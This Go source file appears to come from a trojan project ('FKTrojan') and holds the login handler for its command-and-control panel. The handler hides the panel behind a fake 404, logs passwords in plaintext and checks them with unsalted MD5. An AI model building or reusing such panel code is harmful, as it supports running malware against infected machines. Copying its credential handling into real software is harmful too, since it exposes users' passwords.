/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"fmt"
	"net/http"
	"strings"
)

//------------------------------------------------------------
func LoginHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		if isPanel {
			request.ParseForm()
			ip := strings.Split(request.RemoteAddr, ":")[0]
			name := request.FormValue("username")
			pass := request.FormValue("password")
			redirectTarget := "/"
			if name != "" && pass != "" {
				if name == ControlUser && common.Md5Hash(pass) == ControlPass || IsCanLoginByDB(name, pass) {
					SetSession(name, response)
					redirectTarget = "/panel"
				}
				http.Redirect(response, request, redirectTarget, 302)
			} else {
				FKLog("Failed View Login from " + ip + " using " + name + " and password " + pass)
				fmt.Fprintf(response, "404 page not found")
			}
		}
	}
}

//------------------------------------------------------------
